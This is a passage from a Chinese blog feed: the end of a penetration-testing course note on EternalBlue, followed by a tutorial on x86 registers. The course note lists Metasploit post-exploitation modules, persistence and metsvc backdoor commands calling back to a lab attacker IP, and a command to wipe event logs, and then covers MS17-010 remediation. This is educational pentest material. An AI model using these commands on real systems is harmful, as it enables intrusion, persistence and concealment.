<li>run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives #查看分区</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #获取安装软件信息</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;dumplinks   #获取最近的文件操作</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_ie  #获取IE缓存</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_chrome   #获取Chrome缓存</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</li>
<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_domain  #查找域控</li>
</ul>
<h2 id="后门植入"><a href="#后门植入" class="headerlink" title="后门植入"></a>后门植入</h2><blockquote>
<p>metasploit自带的后门有两种方式启动的，一种是通过启动项启动(persistence)，一种是通过服务启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
</blockquote>
<h3 id="启动项植入"><a href="#启动项植入" class="headerlink" title="启动项植入"></a>启动项植入</h3><ul>
<li>run persistence –h  #查看帮助</li>
<li>run persistence -X -i 5 -p 6661 -r 192.168.159.134 #-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100551201.png" alt="image-20231109100551201"></p>
<p>后门的连接：</p>
<ul>
<li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
<li>msf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
<li>msf &gt; set LHOST 192.168.159.134</li>
<li>msf &gt; set LPORT 6661</li>
<li>msf &gt; exploit</li>
</ul>
<p> 也可以自己生成被控端，而后通过upload指令将其放到靶机的启动目录。</p>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100606830.png" alt="image-20231109100606830"></p>
<h3 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h3><blockquote>
<p>在C:\Users***\AppData\Local\Temp\上传了三个文件（metsrv.x86.dll、metsvc-server.exe、metsvc.exe），通过服务启动，服务名为meterpreter</p>
</blockquote>
<ul>
<li>run metsvc –h   # 查看帮助</li>
<li>run metsvc –A   #自动安装后门</li>
</ul>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100628026.png" alt="image-20231109100628026"></p>
<ul>
<li>msf &gt; use exploit&#x2F;multi&#x2F;handler</li>
<li>msf &gt; set payload windows&#x2F;metsvc_bind_tcp</li>
<li>msf &gt; set RHOST 192.168.159.144</li>
<li>msf &gt; set RPORT 31337</li>
<li>msf &gt; exploit</li>
</ul>
<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><blockquote>
<p><code>run event_manager -c</code>    #清除目标系统的事件日志</p>
</blockquote>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100638600.png" alt="image-20231109100638600"></p>
<h1 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h1><p>报告是渗透测试过程中最为重要的因素，使用报告文档来交流在渗透测试过程中做了哪些，如何做的，以及最为重要的—-客户组织如何修复所发现的安全漏洞和弱点。</p>
<p>永恒之蓝漏洞的修复与防范：</p>
<h2 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h2><ol>
<li><p>为计算机安装最新的安全补丁，微软已发布补丁MS17-010修复了“永恒之蓝”攻击的系统漏洞，请尽快安装此安全补丁，网址为Microsoft 安全公告 MS17-010 - 严重 | Microsoft Docs。</p>
</li>
<li><p>及时备份，一定要离线备份重要文件</p>
</li>
<li><p>开启防火墙</p>
</li>
<li><p>关闭445、135、137、138、139端口，关闭网络共享。</p>
</li>
</ol>
<h4 id="关闭445端口"><a href="#关闭445端口" class="headerlink" title="关闭445端口"></a>关闭445端口</h4><blockquote>
<p>445端口：在局域网中轻松访问各种共享文件夹或共享打印机</p>
</blockquote>
<ol>
<li>WIN+R 运行–regedit</li>
<li>找到注册表项“HKEY_LOCAL_MACHINE\System\Controlset\Services\NetBT\Parameters”		   </li>
<li>选择“Parameters”项，右键单击，选择“新建”——“DWORD值”。(64位  32位根据自己需求)</li>
<li>将DWORD值重命名为“SMBDeviceEnabled”</li>
<li>修改”数值数据”的值为0,点击确定，完成设置</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100648295.png" alt="image-20231109100648295"></p>
<h4 id="关闭135端口"><a href="#关闭135端口" class="headerlink" title="关闭135端口"></a>关闭135端口</h4><blockquote>
<p>135端口：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。</p>
</blockquote>
<ol>
<li>WIN+R 运行–dcomcnfg</li>
<li>在弹出的“组件服务”对话框中，选择“计算机”选项。</li>
<li>右键单击”我的电脑”，选择”属性” </li>
<li>在”默认属性”选项卡中，去掉”在此计算机上启用分布式COM”前的勾。</li>
<li>选择”默认协议”选项卡，选中”面向连接的TCP&#x2F;IP”，单击”移除”按钮。</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100657769.png" alt="image-20231109100657769"></p>
<p>　</p>
<h4 id="关闭137、138、139端口"><a href="#关闭137、138、139端口" class="headerlink" title="关闭137、138、139端口"></a>关闭137、138、139端口</h4><blockquote>
<p>137、138端口：137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS&#x2F;SMB服务</p>
</blockquote>
<ol>
<li>打开网络共享中心 – 更改适配器设置</li>
<li>右键点击属性，把框起来的选项前面的勾去掉，然后卸载</li>
</ol>
<p><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100708132.png" alt="image-20231109100708132"></p>
<ol start="3">
<li>双击Internet 协议版本 4 (TCP&#x2F;IPv4)– 高级–选择WIN</li>
<li>勾选禁用TCP&#x2F;IP上的NetBIOS(S)<br><img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231109100717650.png" alt="image-20231109100717650"></li>
</ol>
<p>做完以上操作 重启即可关闭端口</p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>如果中招 已经被勒索，建议360网址下载查杀工具：<a href="http://dl.360safe.com/nsa/nsatool.exe">http://dl.360safe.com/nsa/nsatool.exe</a></p>
<p>到卡巴斯基下载文件解锁工具：<a href="https://noransom.kaspersky.com/">https://noransom.kaspersky.com/</a></p>
<ol>
<li>打开自己的那个勒索软件界面，点击copy. （复制黑客的比特币地址）</li>
<li>把copy粘贴到btc.com （区块链查询器）</li>
<li>在区块链查询器中找到黑客收款地址的交易记录，然后随意选择一txid（交易哈希值）</li>
<li>把txid 复制粘贴给 勒索软件界面按钮connect us.</li>
<li>等黑客看到后 你再点击勒索软件上的check payment.</li>
<li>再点击decrypt 解密文件即可。</li>
<li>解锁软件：<a href="https://github.com/QuantumLiu/antiBTCHack">https://github.com/QuantumLiu/antiBTCHack</a></li>
<li>实际上并不是物理解密文件</li>
</ol>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言--寄存器整理</title>
    <url>/2022/11/09/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80--%E5%AF%84%E5%AD%98%E5%99%A8%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：学习汇编语言主要有3个原因，一是操作系统学习与汇编语言关系密切，利于解读操作系统源码；二是对于逆向工程来说，汇编语言也是必须学习的；三是对于二进制安全方面的内容，汇编也是核心部分。所以在此单开一个专题用于记录汇编语言的学习，不会从头开始按部就班学习，而是会根据其他知识学习进度选择性学习与整理。</p>
</blockquote>
<h1 id="寄存器整理"><a href="#寄存器整理" class="headerlink" title="寄存器整理"></a>寄存器整理</h1><h2 id="什么是寄存器？"><a href="#什么是寄存器？" class="headerlink" title="什么是寄存器？"></a>什么是寄存器？</h2><blockquote>
<p>寄存器是CPU的一个重要组成部分，主要<strong>用于信息的短期存储</strong>。</p>
</blockquote>
<p>因为RAM与CPU之间需要总线连接进行数据传输，虽然输出速度很快，但是在CPU超高的频率下，很小的延迟也会导致大问题。而由于寄存器就在CPU中，所以其数据传输<strong>基本不耗费时间</strong>，可以极大的提高效率。</p>
<p>同时，对于<strong>寻址</strong>、<strong>计数</strong>等功能也需要专门的空间去存储数据，寄存器就是不二之选。</p>
<h2 id="寄存器的分类"><a href="#寄存器的分类" class="headerlink" title="寄存器的分类"></a>寄存器的分类</h2><blockquote>
<p>在8086CPU中共有14个寄存器，且均为16位。包括：AX、BX、CX、DX、SP、BP、DI、SI、IP、FLAG、CS、DS、SS、ES，这14个寄存器又可以分为通用寄存器、控制寄存器和段寄存器三类。</p>
</blockquote>
<p>在 8086 CPU 中，<strong>通用寄存器</strong>有 8 个，分别是 AX，BX，CX，DX，SP， BP，SI，DI ，通用寄存器除了自身的<strong>专门用途</strong>外，还可以用来<strong>传送数据和暂存数据</strong>，所以才称它们为通用寄存器</p>
<p>而通用寄存器又可以分为三类：<code>数据寄存器</code>（AX、BX、CX、DX等）、<code>指针寄存器</code>（SP、BP）、<code>变址寄存器</code>（SI、DI)。</p>
<hr>
<p><strong>段寄存器</strong>包括CS、DS、SS、ES4个，一般用于存储段地址，具体介绍会在下文介绍。</p>
<hr>
<p><strong>控制寄存器</strong>包括IP和FLAG，这一类寄存器在cpu执行指令时起到控制作用，具体功能在下文专题介绍。</p>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><blockquote>
<p>通用寄存器是所有寄存器中数目最多的一类。其可以分为数据寄存器、指针寄存器和变址寄存器三类，下面具体介绍。</p>
</blockquote>
<h4 id="数据寄存器"><a href="#数据寄存器" class="headerlink" title="数据寄存器"></a>数据寄存器</h4><blockquote>
<p>数据寄存器包括：AX、BX、CX、DX 4个，这4个寄存器有各自负责不同功能</p>
</blockquote>
<blockquote>
<p><code>AX：累加寄存器</code></p>
</blockquote>
<p><code>AX 寄存器</code>，作为<strong>累加器</strong>，特殊用途是在使用<code>DIV</code>和<code>MUL</code>指令时使用</p>
<p><code>DIV</code>在 8086 CPU 中是<strong>除法指令</strong>，使用时应注意：</p>
<ul>
<li>除数，除数可以是8位或者是16位的，保存在一个寄存器或者内存单元中。</li>
<li>被除数，默认放在AX中（或者AX和DX中）：如果除数是8位，那么被除数是16位，放在AX中；如果除数是16位，那么被除数是32位，在DX中存放高16位，AX中存放低16位。</li>
<li>商和余数，如果除数为8位，那么AL存放DIV操作的商，AH存放DIV操作的余数；如果除数为16位，那么AX存放DIV操作的商，DX存放DIV操作的余数。</li>
</ul>
<p>也就是说AX和DX寄存器配合完成除法运算，具体可见下例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">div reg</span><br><span class="line">div 内存单元</span><br><span class="line"></span><br><span class="line">MOV DX,100H		;设置 <span class="number">32</span> 位被除数的高 <span class="number">16</span> 位为 100H</span><br><span class="line">MOV AX,300H		;设置 <span class="number">32</span> 位被除数的低 <span class="number">16</span> 位为 300H</span><br><span class="line">MOV BX,200H		;设置 <span class="number">16</span> 位除数为 200H</span><br><span class="line">DIV BX		    ;执行计算</span><br><span class="line"></span><br><span class="line">根据运算过程可知，除数为<span class="number">16</span>位，被除数是<span class="number">32</span>位，而商和余数是<span class="number">16</span>位，其中商存储在AX中，余数存储在DX中。</span><br></pre></td></tr></table></figure>

<p> <code>MUL</code>在 8086 CPU 中是<strong>乘法指令</strong>，使用时应注意：</p>
<ul>
<li>乘数，两个乘数要么都是8位，要么都是16位。如果是8位数的相乘，一个默认放在AL中，另一个放在内存字节单元或者其他寄存器中；如果是16位相乘，一个默认放在AX中，另一个放在内存字单元或者其他寄存器中。</li>
<li>乘积，8位数相乘结果默认保存在AX中，16位数相乘，默认运算结果有32位，高16位在DX中，低16位在AX中。</li>
</ul>
<p>具体参见下例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mul reg</span><br><span class="line">mul 内存单元</span><br><span class="line"></span><br><span class="line">MOV AX,80H		;设置 <span class="number">16</span> 位乘数为 80H</span><br><span class="line">MOV BX,10H		;设置 <span class="number">16</span> 位乘数为 10H</span><br><span class="line">MOV DX,0H		;清空用来保存乘法结果的高 <span class="number">16</span> 位</span><br><span class="line">MUL BX		    ;执行计算</span><br><span class="line"></span><br><span class="line">通过上述乘法过程可知，一个乘数保存在AX，另一个保存在BX，而执行运算是只需要告知BX即可。结果为<span class="number">32</span>位，高位在DX，低位在AX。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>BX：基地址寄存器</code></p>
</blockquote>
<p>BX主要是用做内存寻址时候表示<strong>偏移地址</strong>，[…]表示一个内存单元，使用格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov 寄存器名，内存单元地址</span><br><span class="line">mov ax, [bx]       ;默认情况下段地址[bx]的段地址在ds中</span><br><span class="line">mov ax, ds:[bx]</span><br><span class="line">mov ax, cs:[bx]    ;可以显式地指明段地址</span><br><span class="line">mov al, [bx]</span><br><span class="line"></span><br><span class="line">mov 内存单元地址，寄存器名</span><br><span class="line">mov [bx], ax</span><br><span class="line">mov [bx], ah</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>CX (Count)：计数器寄存器</code></p>
</blockquote>
<p>CX 作为计数寄存器，在使用<code>loop指令循环</code>时用来指定<strong>循环次数</strong>的寄存器。而 CPU 在每一次执行 loop指令的时候，都会做两件事：一是令<br><code>CX = CX – 1</code>，即令 CX 计数器自动减去 1；还有一件就是<code>判断 CX 中的值</code>，如果 CX 中的值为 0 则会跳出循环，而继续执行循环下面的指令。</p>
<blockquote>
<p><code>DX (Data)：数据寄存器</code></p>
</blockquote>
<p>作为数据寄存器，特殊用途是在使用DIV和MUL指令时使用。详情见 AX (Accumulator)：累加寄存器中的乘法和除法示例。</p>
<h4 id="指针寄存器"><a href="#指针寄存器" class="headerlink" title="指针寄存器"></a>指针寄存器</h4><blockquote>
<p>包括栈指针寄存器SP和基指针寄存器BP，其用途主要是进行栈顶和栈底的界定。</p>
</blockquote>
<blockquote>
<p><code>SP (Stack Pointer)：栈指针寄存器</code></p>
</blockquote>
<p> SP 寄存器上必须和 SS 段寄存器一起使用，表示栈顶的偏移地址.</p>
<p> 其中，SS用于存储栈段地址，而SP则存储偏移地址。而<code>SS:SP</code>即可指向<strong>栈顶地址</strong>。</p>
<p>既然提到栈，就必然涉及到两个操作：入栈和出栈。而这两个操作的实现都是靠SP寄存器来进行的。具体如下：</p>
<ul>
<li>入栈：先进行栈顶的偏移，即<code>SP=SP-2</code>；再进行数据的导入，即将数据放到对应栈空间。</li>
<li>出栈：先进行数据的移除，即将对应数据放到对应位置；再进行栈顶指针的偏移，即<code>SP=SP+2</code>.</li>
</ul>
<p>至于为什么出栈是+2，入栈是-2：因为栈空间在虚拟内存的上方位置，其增长方向是<code>从大地址到小地址</code>的。</p>
<blockquote>
<p><code>BP (Base Pointer)：基指针寄存器</code></p>
</blockquote>
<p>一般来说，BP指向函数调用的基地址，用于界定函数的开始区间。</p>
<p>若没有指定段地址，则以SS段寄存器为主，即<code>SS:BP</code>。</p>
<p><strong>注</strong>：BP和SP寄存器在函数调用时发挥重要作用，同时函数的调用执行过程是一个比较复杂的过程，在理解这个过程时我们要始终记得：<code>BP和SP寄存器只是一个容器，其中存储着指针地址</code>。无论如何描述，是PUSH还是POP都是改变其中的值而已。</p>
<h4 id="变址寄存器"><a href="#变址寄存器" class="headerlink" title="变址寄存器"></a>变址寄存器</h4><blockquote>
<p>包括SI(Source Index）源变址寄存器和DI(Destination Source)目的变址寄存器。</p>
</blockquote>
<p>SI和DI寄存器和BX寄存器的功能类似，通过这两个寄存器可以完成寻址工作，当然也可以存储一般性数据。</p>
<h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><blockquote>
<p>段寄存器与偏移地址（BX、DI、SI、BP、SP、IP）共同构成一个内存空间的具体地址。</p>
</blockquote>
<blockquote>
<p>为什么需要段寄存器和偏移地址组合确定地址，而不直接使用一个寄存器存储内存地址？</p>
</blockquote>
<p><strong>答</strong>：一个寄存器空间太小，无法存储全部的物理地址。</p>
<p>因为地址总线<strong>共20条</strong>，也就是说一个物理地址也有<strong>20位</strong>，寻址能力是<strong>1M</strong>（2的20次方）。</p>
<p>而一个寄存器的大小是<strong>16位</strong>，寻址能力是<strong>64K</strong>，无法表示全部的物理地址。</p>
<p>所以就使用段寄存器和偏移地址的方式<strong>合成一个20位的物理地址</strong>。<code>物理地址=段地址x16+偏移地址</code>。</p>
<p>其实物理地址的计算方法就是将<strong>段地址向左移一位</strong>，而后加上偏移地址即可。</p>
<blockquote>
<p><code>CS (Code Segment)：代码段寄存器</code></p>
</blockquote>
<p>CS中保存代码段寄存器的段地址，通常和IP一起使用，利用<code>CS:IP</code>确定当前<strong>需要执行的指令的地址</strong>。代码段是我们自己定义的一段内存，只是我们自己编程时候的逻辑定义。</p>
<blockquote>
<p><code>DS (Data Segment)：数据段寄存器</code></p>
</blockquote>
<p>DS是数据段寄存器，存放的是<strong>数据段的段地址</strong>，偏移地址通常由BX，SI，DI或者常数给出，<code>DS:BX</code>。数据段是我们自己定义的一段内存，只是我们自己编程时候的逻辑定义。</p>
<blockquote>
<p><code>SS (Stack Segment)：栈段寄存器</code></p>
</blockquote>
<p>SS是栈段寄存器，存放的是<strong>栈段的段地址</strong>，偏移地址通常由SP，BP给出,<code>SS:SP</code>。栈段是我们自己定义的一段内存，只是我们自己编程时候的逻辑定义。</p>
<blockquote>
<p><code>ES (Extra Segment)：附加段寄存器</code></p>
</blockquote>
<p>ES是用于定义一个段的段地址，使用和CS、DS、SS类似。</p>
<h2 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h2><blockquote>
<p>包括IP(指令指针寄存器）和FLAG(标志寄存器）</p>
</blockquote>
<blockquote>
<p><code>IP (Instruction Pointer)：指令指针寄存器</code></p>
</blockquote>
<p>IP通常是和CS一起使用，<code>CS:IP</code>表示将要读取的指令的内存地址，CS表示代码段地址，IP是表示偏移地址。</p>
<blockquote>
<p><code>FLAG标志寄存器</code></p>
</blockquote>
<p>flag寄存器是按位起作用的，也就是说，它的<strong>每一位</strong>都有专门的含义，记录特定的信息。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658458613472.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1658458660363.png"></p>
<p>标志位的值一般来源于ALU（算术逻辑单元）。</p>
<hr>
<blockquote>
<p><strong>第一次补充</strong>：在上述内容的基础上增加了控制与状态寄存器部分。</p>
</blockquote>
<h1 id="多个寄存器的介绍"><a href="#多个寄存器的介绍" class="headerlink" title="多个寄存器的介绍"></a>多个寄存器的介绍</h1><blockquote>
<p>寄存器可以大略分为两类：<code>程序可见寄存器</code>与<code>控制、状态寄存器</code>。</p>
</blockquote>
<ul>
<li><code>程序可见寄存器</code>多用于<strong>存储数据和地址信息</strong>，其目的是为了<strong>提高CPU的访问速度</strong>。常见的程序可见寄存器包括：<code>通用寄存器（存储数据）、地址寄存器（段地址、栈指针、索引地址等）</code>。</li>
<li><code>控制与状态寄存器</code>是一个<strong>寄存器组</strong>，也就是很多个寄存器<strong>分别承担</strong>一部分控制、状态表示的功能，它们共同配合完成<strong>程序控制</strong>与<strong>状态记录</strong>的功能。</li>
</ul>
<p><strong>有一点需要注意</strong>，无论操作系统是多少位，CS\ES\SS等<strong>段寄存器</strong>是16位，并且其中存储的<strong>不是段的基址</strong>而是<code>段选择子</code>，通过段选择子在<strong>段表</strong>里索引查询以获取到<strong>段基址</strong>。</p>
<hr>
<blockquote>
<p><code>控制与状态寄存器</code>用于记录操作系统在控制程序执行时程序的<strong>动态行为、结果</strong>等。这个寄存器组由：<code>指令指针寄存器</code>、<code>FLAG标志寄存器</code>和4个<code>（连号）控制寄存器</code>组成。下面我们<strong>一一介绍</strong>：</p>
</blockquote>
<p><strong>指令指针寄存器介绍</strong></p>
<p><code>指令指针寄存器EIP</code>中存放下一条将要执行指令的<strong>偏移量（offset）</strong>，这个偏移量是相对于目前正在运行的<strong>代码段寄存器CS</strong>而言的。偏移量加上当前代码段的基地址，就形成了下一条指令的地址。EIP中的低16位可以分开来进行访问，给它起名叫指令指针IP寄存器，用于16位寻址。</p>
<p>也就是说CS:IP可以定位到内存中的一个具体地址（可能是虚拟地址，后续还要涉及到页表查询以映射到物理地址），其中存储的就是所要执行的指令代码。当然，计算机硬件MMU会自动完成寻址，无需复杂的操作。</p>
<hr>
<p><strong>标志寄存器介绍</strong></p>
<p><code>标志寄存器EFLAGS</code>存放有关处理器的<strong>控制标志</strong>，是使用<strong>单bit</strong>来进行表示<strong>标志信息</strong>，具体见下图:</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1663055849316.png"></p>
<p>这些标志位可以分为以下三类：<code>状态标志</code>，<code>控制标志</code>和<code>系统标志</code>:</p>
<ul>
<li>AF——辅助进位标志。若该位置位时，表示最低有效的4位向高位产生了进位或借位，则该标志位主要用于BCD算术运算。</li>
<li>CF——进位标志。当该位置位，表示8位或16位或32位数的算术操作产生了进位或借位。进行多字节数的加、减时要使用该标志。循环移位指令也影响进位标志。</li>
<li>PF——奇偶标志。主要用于数据通讯应用程序中，当该位置位时，表示结果数据位中有偶数个1，可以检查数据传送中是否出现错误。</li>
<li>SF——符号标志。该位置时表示结果的最高位(符号位)为1。对于带符号数，该位为1表示负数，该位为0表示正数。</li>
<li>ZF——零标志。当该位置位时，表示操作的结果为0。</li>
<li>DF——方向标志。用于控制数据串操作指令中的地址变化方向。DF为0时，SI&#x2F;DI或ESI&#x2F;EDI为自动增量，地址从低向高变化，DF为1，SI&#x2F;DI或ESI&#x2F;EDI为自动减量，地址从高向低变化。</li>
<li>IF——中断允许标志。该位置1时允许响应外部可屏蔽中断(INTR)，该位复位时禁止响应外部可屏蔽中断。IF不影响非屏蔽外部中断(NMI)或内部产生的中断。</li>
<li>OF——溢出标志。若该位置位表示此次运算发生了溢出，即作为带符号数运算，其结果值超出目的单位所能表示的数值范围。这时目的单位的内容对带符号数没有意义。</li>
<li>TF——陷阱标志。当该位置位时，把处理器置成供调试的单步方式。在这种方式中，每条指令执行后CPU自动产生一个内部中断，使调试者可以观察程序中该条指令执行的情况。</li>
<li>NT——嵌套任务标志。用来表示当前的任务是否嵌套在另一任务内，当该位置1时，表示当前的任务有一个有效的链连接到前一个任务(被嵌套)，如果执行IRET指令，则转换到前一个任务。</li>
<li>IOPL——输入&#x2F;输出特权级标志，用于定义允许执行输入&#x2F;输出指令的I&#x2F;O特权级的数值。</li>
<li>RF——恢复标志。它是与调试寄存器的断点一起使用的标志，当该位置1时，即使遇到断点或调试故障，也不产生异常中断1。在成功地执行每条指令时，RF将自动复位。</li>
<li>VM——虚拟8086方式标志。当该位置位时，CPU工作在虚拟8086模式(简称为拟86模式)，在这种模式下运行8086的程序就好象是在8086CPU上运行一样。</li>
<li>AC——对准检查标志。这是80486新定义的标志位。该位置时，如果进行未对准的地址访问，则产生异常中断17。所谓未对准的地址访问，是指访问字数据时为奇地址，访问双字数据时不是4的倍数地址，访问8字节数据时，不是8的倍数的地址。对准检查在特权级为0，1，2时无效，只有在特权级3时有效。</li>
<li>s—状态标志；c—控制标志；x—系统标</li>
</ul>
<blockquote>
<p>第<strong>12、13位</strong><code>IOPL</code>:<strong>输入输出特权级位</strong>。其值与<strong>输入输出特权级0～3级</strong>相对应。但Linux内核只使用了两个级别，即0和3级，<strong>0表示内核级，3表示用户级</strong>。</p>
<blockquote>
<p>在当前任务的<code>特权级CPL（Current_Privilege_Level）</code>高于或等于<strong>输入输出特权级</strong>时，就可以执行像<code>IN、OUT、INS、OUTS、STI、CLI和LOCK</code>等指令而<strong>不会产生异常13</strong>（即保护异常）。<br>在当前<code>任务特权级CPL</code>为0时，<strong>POPF（从栈中弹出至标志位）指令</strong>和<strong>中断返回指令IRET</strong>可以改变<code>IOPL字段</code>的值。</p>
</blockquote>
</blockquote>
<blockquote>
<p><strong>第9位</strong><code>IF（Interrupt Flag）</code>是<strong>中断标志位</strong>，是用来表示<strong>允许或者禁止外部中断</strong>(具体见<strong>下文中断一节</strong>）</p>
</blockquote>
<p>对于这些<strong>标志位</strong>的含义理解是<strong>很重要的</strong>，这些标志位在之后的学习中也会<strong>频繁出现</strong>，我们会在出现时<strong>深入介绍</strong>。</p>
<hr>
<p><strong>4个控制寄存器介绍：</strong></p>
<p>除了上面介绍的两个寄存器之外，还有4个<strong>控制寄存器</strong>：<code>CR0~4</code> ，其<strong>结构见下图</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1663054710029.png"></p>
<p>这几个寄存器中<strong>保存全局性和任务无关的机器状态</strong>。也就是说<strong>其值不会因为执行的进程不同而发生改变</strong>，而EFALGS寄存器、EIP寄存器等的值会<strong>动态变化</strong>以记录进程不同时间下的状态信息。</p>
<blockquote>
<p><code>CR0</code>中包含了<strong>6个预定义标志</strong>，我们这里需要重点记住<strong>其中两个</strong>：<code>0位</code>是<strong>保护允许位</strong><code>PE(ProtedtedEnable)</code>，用于<strong>启动保护模式</strong>，如果PE位置1，则保护模式启动，如果PE&#x3D;0，则在实模式下运行。CR0的第<code>31位</code>是<strong>分页允许位</strong><code>(PagingEnable)</code>，它表示芯片上的<strong>分页部件</strong>是否允许工作。</p>
<blockquote>
<p>由<code>PG位</code>和<code>PE位</code>定义的<strong>操作方式</strong>如下图所示：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1663055008944.png"><br>即通过这两个位的值来确定<strong>操作系统的操作模式</strong>，一般来说会在操作系统<strong>启动时</strong>使用实模式，而后在<strong>启动中途</strong>（具体到steup.s)时切换到保护模式。这两个模式的一个显著差别就是<strong>寻址方式的不同</strong>：<code>前者使用20位移位加和的方式、后者使用到段表寻址</code>。</p>
</blockquote>
</blockquote>
<blockquote>
<p><code>CR1</code>是<strong>未定义的控制寄存器</strong>，供将来的处理器使用。</p>
</blockquote>
<blockquote>
<p><code>CR2</code>是<strong>页故障线性地址寄存器</strong>，保存最后一次出现<strong>页故障</strong>的全32位线性地址。</p>
</blockquote>
<blockquote>
<p><code>CR3</code>是<strong>页目录基址寄存器</strong>，保存页目录表的<strong>物理地址</strong>，页目录表总是放在以4K字节为单位的存储器边界上，因此，它的地址的<strong>低12位总为0</strong>，不起作用，即使写上内容，也不会被理会。(在Linux0.11中，页表被放在0地址处，也就是说cr3寄存器为0）</p>
<blockquote>
<p>有关<strong>段页式内存管理</strong>的相关内容可以参考<strong>本专题内存管理文章</strong>，我们后面也会进行补充。</p>
</blockquote>
</blockquote>
<hr>
<p><strong>其他寄存器介绍</strong>：</p>
<p>除了我们上面介绍的几个寄存器之外，还有很多其他功能的寄存器，下面我们选择<strong>一些常见</strong>的进行介绍：</p>
<ul>
<li><code>GDTR</code>：48位<strong>全局描述符表寄存器</strong>，用于保存<strong>全局描述符表</strong>的32位基地址和全局描述符表的16位界限（<code>全局描述符表最大为 216216 字节，共216/8=8K216/8=8K个全局描述符</code>）。GDT表里面的每一项都表明<strong>一个段的信息</strong>，或者是一个<strong>LDT表的相关信息</strong>。其实一个LDT表也是一个段。所以也可以说GDT表的每一项都<strong>描述一个段</strong>。就像一个文件夹下面可以有文件，也可以有文件夹一样，GDT表里面既可以有段描述符，也可以有LDT的表。</li>
<li><code>IDTR</code>:48位<strong>中断描述符表寄存器</strong>，用于保存<strong>中断描述符表</strong>的32位基地址和中断描述符表的16位界限（<code>中断描述符表最大为 216216 字节，共216/8=8K216/8=8K个中断描述符</code>）。</li>
<li><code>LDTR</code>:16位<strong>局部描述符表寄存器</strong>，用于保存局部描述符表的<strong>选择符</strong>。一旦16位的选择符（也叫选择子）放入LDTR，CPU会自动将选择符所指定的局部描述符装入<strong>64位的局部描述符寄存器</strong>中。</li>
<li><code>TR</code>:16位<strong>任务状态段寄存器</strong>，用于保存任务状态段(TSS)的16位选择符。与LDTR类似，一旦16位的选择符放入TR，CPU会自动将该选择符所指定的任务描述符装入64位的<strong>任务描述符寄存器</strong>中。 <strong>注：TSS是一个段，所以在GDT中有对应的表项描述</strong>。</li>
</ul>
